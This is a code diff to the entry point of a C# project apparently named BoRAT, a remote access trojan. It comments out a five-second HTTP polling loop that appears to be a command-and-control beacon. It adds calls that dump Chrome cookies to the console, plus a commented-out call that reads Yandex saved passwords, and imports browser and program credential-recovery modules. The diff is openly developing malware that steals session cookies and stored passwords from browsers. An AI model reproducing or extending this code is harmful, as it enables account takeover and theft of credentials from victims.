@@ -1,6 +1,7 @@
 ﻿using System;
-using System.Threading;
 using BoRAT.Core.Network;
+using BoRAT.Core.Recovery.Programs;
+using BoRAT.Core.Data;
 using BoRAT.Core.Recovery.Browsers;
 
 namespace BoRAT
@@ -9,11 +10,17 @@ namespace BoRAT
     {
         static void Main(string[] args)
         {
-            while(true)
-            {
-                Http.Request();
-                Thread.Sleep(5000);
-            }
+            //foreach (RecoveredAccount acc in Yandex.GetSavedPasswords())
+            //    Console.Write(acc.ToString());
+
+            foreach (Cookie acc in Chrome.GetCookies())
+                Console.Write(acc.ToString());
+
+            //while(true)
+            //{
+            //    Http.Request();
+            //    Thread.Sleep(5000);
+            //}
 
             Console.ReadKey();
         }
